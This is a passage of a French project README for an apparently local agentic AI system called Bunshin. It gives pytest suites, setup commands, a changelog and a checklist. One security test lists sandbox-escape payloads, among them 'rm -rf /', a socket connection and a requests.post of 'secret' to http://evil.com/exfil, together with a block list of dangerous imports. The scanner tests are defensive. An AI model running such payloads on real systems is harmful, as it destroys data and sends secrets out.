    monkeypatch.setenv("CHROMA_SERVER_PORT", "8001")
    import memory.ingest_pipeline as m
    importlib.reload(m)


def test_dry_run_does_not_call_chroma():
    with patch("memory.ingest_pipeline._load_chunks", return_value=["chunk1", "chunk2"]), \
         patch("memory.ingest_pipeline._embed_one") as mock_embed, \
         patch("chromadb.HttpClient") as mock_chroma, \
         patch("kuzu.Database"):
        from memory.ingest_pipeline import ingest
        ingest("./workspace/input/test.pdf", mode="hybrid", dry_run=True)
    mock_embed.assert_not_called()
    mock_chroma.assert_not_called()


def test_dry_run_does_not_call_kuzu():
    with patch("memory.ingest_pipeline._load_chunks", return_value=["chunk1"]), \
         patch("kuzu.Database") as mock_kuzu:
        from memory.ingest_pipeline import ingest
        ingest("./workspace/input/test.pdf", mode="graph", dry_run=True)
    mock_kuzu.assert_not_called()


def test_embed_one_uses_cache(tmp_path, monkeypatch):
    monkeypatch.setenv("CACHE_PATH", str(tmp_path / "cache2"))
    import memory.ingest_pipeline as m
    importlib.reload(m)
    mock_ollama = MagicMock()
    mock_ollama.embeddings.return_value = {"embedding": [0.1, 0.2, 0.3]}
    with patch("memory.ingest_pipeline.ollama.Client", return_value=mock_ollama):
        r1 = m._embed_one("texte de test")
        r2 = m._embed_one("texte de test")
    assert r1 == r2 == [0.1, 0.2, 0.3]
    assert mock_ollama.embeddings.call_count == 1


def test_embed_one_different_texts_call_ollama_twice(tmp_path, monkeypatch):
    monkeypatch.setenv("CACHE_PATH", str(tmp_path / "cache3"))
    import memory.ingest_pipeline as m
    importlib.reload(m)
    mock_ollama = MagicMock()
    mock_ollama.embeddings.return_value = {"embedding": [0.5, 0.6]}
    with patch("memory.ingest_pipeline.ollama.Client", return_value=mock_ollama):
        m._embed_one("texte A"); m._embed_one("texte B")
    assert mock_ollama.embeddings.call_count == 2


def test_ingest_vector_calls_chroma():
    mock_collection   = MagicMock()
    mock_chroma_client = MagicMock()
    mock_chroma_client.get_or_create_collection.return_value = mock_collection
    with patch("memory.ingest_pipeline._load_chunks", return_value=["chunk_a"]), \
         patch("memory.ingest_pipeline._embed_one",   return_value=[0.1, 0.2]), \
         patch("chromadb.HttpClient", return_value=mock_chroma_client):
        from memory.ingest_pipeline import ingest
        ingest("./doc.txt", mode="vector", dry_run=False)
    mock_collection.add.assert_called_once()


def test_ingest_graph_calls_kuzu(tmp_path, monkeypatch):
    monkeypatch.setenv("KUZU_PATH", str(tmp_path / "graph"))
    mock_conn = MagicMock()
    mock_db   = MagicMock()
    with patch("memory.ingest_pipeline._load_chunks",      return_value=["chunk_b"]), \
         patch("memory.ingest_pipeline._extract_entities", return_value=[]), \
         patch("kuzu.Database", return_value=mock_db), \
         patch("kuzu.Connection", return_value=mock_conn):
        from memory.ingest_pipeline import ingest
        ingest("./doc.md", mode="graph", dry_run=False)
    assert mock_conn.execute.called
```

### `tests/unit/test_code_scanner.py` — Code complet (NEW v2.5)

```python
"""tests/unit/test_code_scanner.py"""
import pytest
from safety.code_scanner import scan_imports, full_scan, _extract_imports


def test_extract_import_simple():
    imports = _extract_imports("import json\nimport math")
    assert "json" in imports and "math" in imports


def test_extract_import_from():
    assert "datetime" in _extract_imports("from datetime import datetime")


def test_extract_import_from_os():
    assert "os" in _extract_imports("from os import system")


def test_extract_import_syntax_error():
    assert _extract_imports("def (broken syntax !!!") == set()


def test_extract_import_empty():
    assert _extract_imports("result = 1 + 1") == set()


def test_scan_import_math_safe():
    assert scan_imports("import math") is True


def test_scan_import_os_blocked():
    assert scan_imports("import os") is False


def test_scan_from_os_import_system_blocked():
    assert scan_imports("from os import system") is False


def test_scan_import_json_safe():
    assert scan_imports("import json") is True


def test_scan_import_subprocess_blocked():
    assert scan_imports("import subprocess") is False


def test_scan_import_sys_blocked():
    assert scan_imports("import sys") is False


def test_scan_import_shutil_blocked():
    assert scan_imports("import shutil") is False


def test_scan_import_socket_blocked():
    assert scan_imports("import socket") is False


def test_scan_import_ctypes_blocked():
    assert scan_imports("import ctypes") is False


def test_scan_import_requests_blocked():
    assert scan_imports("import requests") is False


def test_scan_import_pandas_safe():
    assert scan_imports("import pandas") is True


def test_scan_import_numpy_safe():
    assert scan_imports("import numpy") is True


def test_scan_import_unknown_blocked():
    assert scan_imports("import flask") is False


def test_full_scan_safe_code():
    ok, msg = full_scan("import math\nresult = math.sqrt(16)")
    assert ok is True and msg == "ok"


def test_full_scan_blocked_import():
    ok, msg = full_scan("import os\nos.system('ls')")
    assert ok is False and "import interdit" in msg
```

### `tests/unit/test_resource_monitor.py` — Code complet (NEW v2.5)

```python
"""tests/unit/test_resource_monitor.py"""
import pytest
from unittest.mock import patch, MagicMock


def _make_mem(total_gb=16.0, available_gb=8.0, percent=50.0):
    m = MagicMock()
    m.total     = int(total_gb    * 1024 ** 3)
    m.available = int(available_gb * 1024 ** 3)
    m.percent   = percent
    return m


def test_get_free_ram_gb_returns_correct_value():
    with patch("psutil.virtual_memory", return_value=_make_mem(available_gb=6.0)):
        from core.resource_monitor import get_free_ram_gb
        assert get_free_ram_gb() == pytest.approx(6.0, abs=0.05)


def test_should_offload_false_when_ram_ok():
    with patch("psutil.virtual_memory", return_value=_make_mem(available_gb=8.0)):
        from core.resource_monitor import should_offload_to_cloud
        assert should_offload_to_cloud() is False


def test_should_offload_true_when_ram_critical():
    with patch("psutil.virtual_memory", return_value=_make_mem(available_gb=0.5)):
        from core.resource_monitor import should_offload_to_cloud
        assert should_offload_to_cloud() is True


def test_should_offload_exactly_one_gb_boundary():
    with patch("psutil.virtual_memory", return_value=_make_mem(available_gb=1.0)):
        from core.resource_monitor import should_offload_to_cloud
        assert should_offload_to_cloud() is False


def test_get_ram_status_has_required_keys():
    with patch("psutil.virtual_memory",
               return_value=_make_mem(total_gb=16.0, available_gb=4.0, percent=75.0)):
        from core.resource_monitor import get_ram_status
        status = get_ram_status()
    for key in ("total_gb", "free_gb", "used_percent", "offload_required"):
        assert key in status


def test_get_ram_status_values():
    with patch("psutil.virtual_memory",
               return_value=_make_mem(total_gb=16.0, available_gb=4.0, percent=75.0)):
        from core.resource_monitor import get_ram_status
        s = get_ram_status()
    assert s["total_gb"]     == pytest.approx(16.0, abs=0.1)
    assert s["free_gb"]      == pytest.approx(4.0,  abs=0.1)
    assert s["used_percent"] == pytest.approx(75.0, abs=0.5)


def test_get_ram_status_offload_required_true():
    with patch("psutil.virtual_memory",
               return_value=_make_mem(available_gb=0.3, percent=98.0)):
        from core.resource_monitor import get_ram_status
        assert get_ram_status()["offload_required"] is True
```

### `tests/security/test_sandbox_escape.py` — Code complet (NEW v2.5)

```python
"""tests/security/test_sandbox_escape.py
8 payloads d'évasion — tous bloqués.
"""
import pytest
from safety.code_scanner import scan_imports, full_scan

ESCAPE_PAYLOADS = [
    ("import os\nos.system('rm -rf /')",                           "os import direct"),
    ("from os import system\nsystem('whoami')",                    "from os import system"),
    ("import subprocess\nsubprocess.run(['ls', '-la'])",           "subprocess"),
    ("import sys\nsys.exit(0)",                                    "sys"),
    ("import shutil\nshutil.rmtree('/tmp/bunshin')",               "shutil"),
    ("import socket\ns = socket.socket()\ns.connect(('evil.com', 80))", "socket"),
    ("import ctypes\nctypes.cdll.LoadLibrary('libevil.so')",       "ctypes"),
    ("import requests\nrequests.post('http://evil.com/exfil', data='secret')", "requests"),
]


@pytest.mark.parametrize("payload,description", ESCAPE_PAYLOADS)
def test_escape_payload_blocked_by_scan_imports(payload, description):
    assert scan_imports(payload) is False, \
        f"[SÉCURITÉ] Payload '{description}' NON bloqué par scan_imports() !"


@pytest.mark.parametrize("payload,description", ESCAPE_PAYLOADS)
def test_escape_payload_blocked_by_full_scan(payload, description):
    ok, report = full_scan(payload)
    assert ok is False, \
        f"[SÉCURITÉ] Payload '{description}' NON bloqué par full_scan() !"


def test_multiline_blocked_import():
    code = "import math\ndef compute():\n    import os\n    return os.getcwd()"
    assert scan_imports(code) is False


def test_nested_from_import_blocked():
    assert scan_imports("from subprocess import check_output") is False


def test_combined_safe_and_unsafe_blocked():
    assert scan_imports("import math\nimport json\nimport sys") is False
```

### `tests/unit/test_orchestrator_nodes.py` — Extrait v2.4 (inclus pour référence)

```python
"""tests/unit/test_orchestrator_nodes.py"""
import os
import pytest
from unittest.mock import patch, AsyncMock
from core.orchestrator import (
    AgentState, plan_node, verify_node,
    route_after_verify, cloud_check_node, MAX_RETRIES
)


# ── IMPORTANT v2.5 ────────────────────────────────────────────────────────────
# cloud.bridge valide ENCRYPTION_KEY à l'import → les tests qui patchent
# cloud.bridge.offload doivent setter la variable d'env AVANT l'import du module.
# La fixture ci-dessous le garantit pour tous les tests cloud_check_node.

@pytest.fixture(autouse=True)
def set_encryption_key(monkeypatch):
    """Fournit une ENCRYPTION_KEY de test pour éviter le ValueError de bridge.py."""
    from cryptography.fernet import Fernet
    monkeypatch.setenv("ENCRYPTION_KEY", Fernet.generate_key().decode())


def test_plan_node_success():
    state = AgentState(prompt="Trie un CSV")
    with patch("core.orchestrator.brain_query", return_value="Trier le CSV par date"):
        result = plan_node(state)
    assert result.plan == "Trier le CSV par date"
    assert result.error is None


def test_verify_node_max_retries_returns_degraded():
    state = AgentState(prompt="test", result="", retry_count=MAX_RETRIES)
    assert "[DÉGRADÉ]" in (verify_node(state).result or "")


def test_route_not_verified_at_max_returns_end():
    """FIX v2.2 — retry_count == MAX_RETRIES doit retourner 'end', pas 'retry'."""
    state = AgentState(prompt="test", verified=False, retry_count=MAX_RETRIES)
    assert route_after_verify(state) == "end"


def test_route_not_verified_below_max_returns_retry():
    state = AgentState(prompt="test", verified=False, retry_count=0)
    assert route_after_verify(state) == "retry"


async def test_cloud_check_passes_when_ram_ok():
    state = AgentState(prompt="test")
    with patch("core.orchestrator.should_offload_to_cloud", return_value=False):
        result = await cloud_check_node(state)
    assert result.verified is False


async def test_cloud_check_passes_when_cloud_disabled():
    state = AgentState(prompt="test")
    with patch("core.orchestrator.should_offload_to_cloud", return_value=True), \
         patch("core.orchestrator.CLOUD_ENABLED", False):
        result = await cloud_check_node(state)
    assert result.verified is False


async def test_cloud_check_offloads_when_ram_critical():
    state = AgentState(prompt="test")
    with patch("core.orchestrator.should_offload_to_cloud", return_value=True), \
         patch("core.orchestrator.CLOUD_ENABLED", True), \
         patch("cloud.bridge.offload", return_value="résultat_cloud"):
        result = await cloud_check_node(state)
    assert result.verified is True
    assert result.result == "résultat_cloud"


async def test_cloud_check_fallback_on_cloud_error():
    state = AgentState(prompt="test")
    with patch("core.orchestrator.should_offload_to_cloud", return_value=True), \
         patch("core.orchestrator.CLOUD_ENABLED", True), \
         patch("cloud.bridge.offload", return_value="CLOUD_ERROR: timeout"):
        result = await cloud_check_node(state)
    assert result.verified is False
    assert result.error is None
```

> ⚠️ **FIX v2.5 — fixture `set_encryption_key`** : `cloud.bridge` valide `ENCRYPTION_KEY` dès son import, ce qui levait un `ValueError` dans tous les tests `cloud_check_node` de la v2.4. La fixture `autouse=True` injecte une clé Fernet valide avant chaque test, sans toucher au `.env` réel.

### `tests/unit/test_runpod_adapter.py`

```python
"""tests/unit/test_runpod_adapter.py"""
import base64
import os
import pytest
from unittest.mock import patch, MagicMock


@pytest.fixture(autouse=True)
def set_env(monkeypatch):
    monkeypatch.setenv("RUNPOD_API_KEY",  "test_key_abc")
    monkeypatch.setenv("CLOUD_ENDPOINT",  "https://api.runpod.ai/v2/")
    monkeypatch.setenv("AGENT_TIMEOUT",   "10")
    monkeypatch.setenv("CLOUD_MAX_RETRIES", "2")


def _make_adapter():
    from cloud.providers.runpod_adapter import RunPodAdapter
    return RunPodAdapter()


def test_send_task_returns_task_id():
    adapter = _make_adapter()
    mock_resp = MagicMock()
    mock_resp.json.return_value = {"id": "task_123"}
    mock_resp.raise_for_status = MagicMock()
    with patch("cloud.providers.runpod_adapter.requests.post", return_value=mock_resp):
        assert adapter.send_task(b"encrypted_payload") == "task_123"


def test_send_task_raises_if_no_task_id():
    adapter = _make_adapter()
    mock_resp = MagicMock()
    mock_resp.json.return_value = {}
    mock_resp.raise_for_status = MagicMock()
    with patch("cloud.providers.runpod_adapter.requests.post", return_value=mock_resp):
        with pytest.raises(RuntimeError, match="task_id"):
            adapter.send_task(b"payload")


def test_get_result_completed():
    adapter      = _make_adapter()
    payload_b64  = base64.b64encode(b"result_data").decode()
    mock_resp    = MagicMock()
    mock_resp.json.return_value = {"status": "COMPLETED",
                                   "output": {"result": payload_b64}}
    mock_resp.raise_for_status = MagicMock()
    with patch("cloud.providers.runpod_adapter.requests.get", return_value=mock_resp):
        result = adapter.get_result("task_123")
    assert result["status"] == "completed"
    assert result["result"] == b"result_data"


def test_get_result_pending():
    adapter = _make_adapter()
    mock_resp = MagicMock()
    mock_resp.json.return_value = {"status": "IN_QUEUE"}
    mock_resp.raise_for_status = MagicMock()
    with patch("cloud.providers.runpod_adapter.requests.get", return_value=mock_resp):
        assert adapter.get_result("task_123")["status"] == "pending"


def test_get_result_failed():
    adapter = _make_adapter()
    mock_resp = MagicMock()
    mock_resp.json.return_value = {"status": "FAILED", "error": "OOM"}
    mock_resp.raise_for_status = MagicMock()
    with patch("cloud.providers.runpod_adapter.requests.get", return_value=mock_resp):
        result = adapter.get_result("task_123")
    assert result["status"] == "failed" and "OOM" in result["error"]


def test_estimate_cost():
    assert abs(_make_adapter().estimate_cost(1024) - 0.0002) < 1e-6


def test_poll_until_done_success():
    adapter  = _make_adapter()
    payload  = base64.b64encode(b"done").decode()
    results  = iter([{"status": "IN_QUEUE"}, {"status": "IN_PROGRESS"},
                     {"status": "COMPLETED", "output": {"result": payload}}])
    def _mock_get(*a, **kw):
        m = MagicMock(); m.json.return_value = next(results)
        m.raise_for_status = MagicMock(); return m
    with patch("cloud.providers.runpod_adapter.requests.get", side_effect=_mock_get), \
         patch("cloud.providers.runpod_adapter.time.sleep"):
        result = adapter.poll_until_done("task_123")
    assert result["status"] == "completed"


def test_missing_api_key_raises():
    os.environ.pop("RUNPOD_API_KEY", None)
    import importlib
    import cloud.providers.runpod_adapter as mod
    with pytest.raises(ValueError, match="RUNPOD_API_KEY"):
        importlib.reload(mod)
        mod.RunPodAdapter()
```

### Lancer les tests

```bash
# Dépendances hôte
pip install -r requirements-host.txt

# Tests unitaires (sans Docker)
pytest tests/unit/ -v

# Tests de sécurité
pytest tests/security/ -v

# Tous les tests
pytest tests/ -v

# Régression v2.2 — boucle infinie
pytest tests/unit/test_orchestrator_nodes.py::test_route_not_verified_at_max_returns_end -v

# Tests cloud v2.4
pytest tests/unit/test_orchestrator_nodes.py -k "cloud" -v
pytest tests/unit/test_runpod_adapter.py -v
```

---

## 17. Guide de démarrage rapide

```bash
# 1. Cloner et configurer
git clone https://github.com/votre-repo/bunshin.git && cd bunshin
cp .env.example .env

# 2. Remplir .env — OBLIGATOIRE avant de continuer
#    RUNPOD_API_KEY=<ta clé RunPod>
#    ENCRYPTION_KEY=$(python -c "from cryptography.fernet import Fernet; \
#                                print(Fernet.generate_key().decode())")

# 3. Initialiser (répertoires + __init__.py + Docker check + spaCy + Kuzu + Ollama)
bash setup.sh

# 4. Démarrer tous les services
docker compose up -d

# 5. Vérifier que les 4 services sont healthy
docker compose ps

# 6. Tests unitaires (sans Docker)
pytest tests/unit/ -v

# 7. Tests de sécurité
pytest tests/security/ -v

# 8. Ingestion d'un document (via Docker — recommandé)
docker compose exec fastapi_backend python memory/ingest_pipeline.py \
  --file /app/workspace/input/doc.pdf --mode hybrid

# 9. Ingestion depuis l'hôte (hors Docker)
CHROMA_SERVER_HOST=localhost CHROMA_SERVER_PORT=8001 \
OLLAMA_HOST=http://localhost:11434 \
python memory/ingest_pipeline.py --file ./workspace/input/doc.pdf --mode hybrid

# 10. Accéder à l'UI
#     Dashboard  : http://localhost:3000
#     API docs   : http://localhost:8000/docs
#     Coût Cloud : curl http://localhost:8000/cost
```

### Reset complet

```bash
docker compose down -v
rm -rf ./memory/vector_store ./memory/graph_store ./memory/cache
bash setup.sh && docker compose up -d
```

---

## 18. Historique des corrections

### 🔴 v2.2 — Bloquant

| #   | Fichier                   | Bug                                             | Correction               |
| :-- | :------------------------ | :---------------------------------------------- | :----------------------- |
| 1   | `requirements.txt`        | `spacy` absent                                  | `spacy>=3.7.0` ajouté    |
| 2   | `.env.example`            | `OLLAMA_HOST=localhost` erroné dans Docker      | → `http://ollama:11434`  |
| 3   | `ui/Dockerfile.api`       | Context `./ui` → pas d'accès aux autres modules | Context → `.` (racine)   |
| 4   | `docker-compose.yml`      | `fastapi_backend` sans volumes `memory/`        | Volumes montés           |
| 5   | `core/orchestrator.py`    | `retry_count <= MAX_RETRIES` → boucle infinie   | → `< MAX_RETRIES`        |
| 6   | `ui/app.py`               | Dashboard incomplet                             | Code complet             |
| 7   | `ui/Dockerfile.streamlit` | Absent                                          | Créé                     |
| 8   | `ui/api_rest.py`          | `ChatRequest`/`IngestRequest` non définies      | Modèles Pydantic ajoutés |

### 🟡 v2.2 — Important

| #   | Fichier                      | Bug                                                  | Correction             |
| :-- | :--------------------------- | :--------------------------------------------------- | :--------------------- |
| 9   | `memory/ingest_pipeline.py`  | `_embed_one()` non définie                           | Implémentée            |
| 10  | `safety/code_scanner.py`     | `scan_imports()` non implémentée                     | AST + Bandit           |
| 11  | `agents_factory/executor.py` | `get_event_loop()` déprécié Python 3.10+             | → `get_running_loop()` |
| 12  | `cloud/bridge.py`            | Clé Fernet silencieuse → différente à chaque restart | `ValueError` explicite |
| 13  | `ui/api_rest.py`             | `/ingest` synchrone bloquait l'event loop            | `run_in_executor`      |
| 14  | `ui/api_rest.py`             | Pas de `CORSMiddleware`                              | Ajouté                 |
| 15  | `requirements-host.txt`      | `ollama`, `langgraph` absents                        | Ajoutés                |
| 16  | `docker-compose.yml`         | Volume `logs/` absent sur `streamlit_ui`             | Ajouté                 |

### 🔴 v2.3 — Bloquant

| #   | Fichier                             | Bug                               | Correction                |
| :-- | :---------------------------------- | :-------------------------------- | :------------------------ |
| 17  | `cloud/providers/runpod_adapter.py` | Absent                            | Créé                      |
| 18  | `cloud/providers/base.py`           | Absent                            | Créé                      |
| 19  | `core/orchestrator.py`              | Cloud documenté mais jamais câblé | `cloud_check_node` ajouté |

### 🔴 v2.4 — Bloquant

| #   | Fichier                             | Bug                                                | Correction            |
| :-- | :---------------------------------- | :------------------------------------------------- | :-------------------- |
| 20  | `pytest.ini`                        | Absent → tests `async def` ignorés silencieusement | `asyncio_mode = auto` |
| 21  | `core/orchestrator.py`              | `cloud_check_node` : stubs vides                   | Code complet          |
| 22  | `cloud/providers/runpod_adapter.py` | Stubs vides                                        | Code complet          |
| 23  | `cloud/providers/base.py`           | Imports `ABC`, `abstractmethod`, `os` manquants    | Imports ajoutés       |
| 24  | `core/orchestrator.py`              | `CLOUD_ENABLED` jamais lu                          | `os.getenv` ajouté    |

### 🔴 v2.5 — Bloquant (NEW)

| #   | Fichier                                 | Bug                                                                                                          | Correction                                                        |
| :-- | :-------------------------------------- | :----------------------------------------------------------------------------------------------------------- | :---------------------------------------------------------------- |
| 25  | `cloud/cost_tracker.py`                 | **Code source absent du README** — importé par `bridge.py` et `api_rest.py`, démarrage impossible            | Code source complet fourni en section 9                           |
| 26  | `memory/ingest_pipeline.py`             | **Code source absent du README** — importé par `api_rest.py` et `setup.sh`                                   | Code source complet fourni en section 8                           |
| 27  | `__init__.py` (×10)                     | Mentionnés dans une note mais jamais créés — `ModuleNotFoundError` garanti                                   | `setup.sh` les crée + création manuelle documentée en section 2.2 |
| 28  | `.gitignore`                            | Listé dans l'arborescence mais **contenu jamais fourni**                                                     | Contenu complet fourni en section 2.1 + `setup.sh` le génère      |
| 29  | `setup.sh`                              | Ne créait pas les `__init__.py`, ne validait pas `ENCRYPTION_KEY`, ne vérifiait pas `.gitignore`             | Réécriture complète [1/8] → [8/8]                                 |
| 30  | `tests/unit/test_orchestrator_nodes.py` | `cloud.bridge` valide `ENCRYPTION_KEY` à l'import → `ValueError` dans tous les tests `cloud_check_*` de v2.4 | Fixture `set_encryption_key(autouse=True)` ajoutée                |

### 🟡 v2.5 — Important (NEW)

| #   | Fichier                                 | Bug                                                                                                                                    | Correction                               |
| :-- | :-------------------------------------- | :------------------------------------------------------------------------------------------------------------------------------------- | :--------------------------------------- |
| 31  | `requirements-host.txt`                 | `diskcache`, `chromadb`, `RestrictedPython`, `presidio-*`, `pydantic`, `bandit` absents → `pytest tests/unit/ -v` échouait hors Docker | 7 dépendances ajoutées                   |
| 32  | `tests/unit/test_brain.py`              | **Code source absent du README**                                                                                                       | Code source complet fourni en section 16 |
| 33  | `tests/unit/test_cost_tracker.py`       | **Code source absent du README**                                                                                                       | Code source complet fourni en section 16 |
| 34  | `tests/unit/test_ingest.py`             | **Code source absent du README**                                                                                                       | Code source complet fourni en section 16 |
| 35  | `tests/unit/test_code_scanner.py`       | **Code source absent du README**                                                                                                       | Code source complet fourni en section 16 |
| 36  | `tests/unit/test_resource_monitor.py`   | **Code source absent du README**                                                                                                       | Code source complet fourni en section 16 |
| 37  | `tests/security/test_sandbox_escape.py` | **Code source absent du README**                                                                                                       | Code source complet fourni en section 16 |

---

## 19. Checklist de validation

### Infrastructure

- [ ] `bash setup.sh` → `[1/8]` à `[8/8]` tous affichés sans erreur
- [ ] `docker compose ps` → 4 services **healthy** (chromadb, ollama, fastapi_backend, streamlit_ui)
- [ ] `http://localhost:3000` → dashboard accessible, jauge RAM visible, coût Cloud visible
- [ ] `curl http://localhost:8000/health` → `{"status": "ok"}`
- [ ] `curl http://localhost:8000/cost` → `{"total_usd": 0.0}`
- [ ] `http://localhost:8000/docs` → Swagger avec `/chat`, `/ingest`, `/ram`, `/reset`, `/cost`

### Packages Python

- [ ] `python -c "import core.brain"` → pas d'erreur (vérifie les `__init__.py`)
- [ ] `python -c "import cloud.cost_tracker"` → pas d'erreur
- [ ] `python -c "import memory.ingest_pipeline"` → pas d'erreur
- [ ] `python -c "import safety.code_scanner"` → pas d'erreur

### Cloud Bursting

- [ ] `from cloud.providers.base import CloudProvider` → pas d'erreur
- [ ] `from cloud.providers.runpod_adapter import RunPodAdapter` → pas d'erreur
- [ ] `CLOUD_ENABLED=false` dans `.env` → `cloud_check_node` passe sans appeler `bridge`
- [ ] Démarrer sans `ENCRYPTION_KEY` dans `.env` → `ValueError` explicite au boot FastAPI
- [ ] `CLOUD_COST_LIMIT_USD=0.00` → envoi refusé, log d'erreur explicite

### Corrections logiques

- [ ] Prompt générant un résultat vide → `[DÉGRADÉ]` après exactement 2 retries (pas de boucle infinie)
- [ ] `dry_run=true` dans `/ingest` → rien persisté dans ChromaDB ni Kuzu
- [ ] Kuzu et Diskcache survivent à `docker compose restart fastapi_backend`
- [ ] `logs/cloud_costs.jsonl` : chaque appel Cloud ajoute une ligne JSON

### Tests

- [ ] `pytest tests/unit/ -v` → **100% vert sans Docker**
- [ ] `pytest tests/security/ -v` → 8 payloads d'évasion tous bloqués
- [ ] `pytest tests/unit/test_orchestrator_nodes.py::test_route_not_verified_at_max_returns_end` → vert
- [ ] `pytest tests/unit/test_orchestrator_nodes.py -k "cloud"` → 5 tests verts
- [ ] `pytest tests/unit/test_runpod_adapter.py -v` → 8 tests verts
- [ ] Aucun test `async def` ignoré silencieusement

### Sécurité

- [ ] `git status` → `.env` absent du tracking Git
- [ ] `scan_imports("import os")` → `False`
- [ ] `scan_imports("import math")` → `True`
- [ ] `scan_imports("from os import system")` → `False`

---

_Bunshin v2.5 · Architecture Agentique Souverain · MSI Ryzen 7 7730U · 2026_

(model llm conseillé par claude: Qwen2.5-Coder 32B)
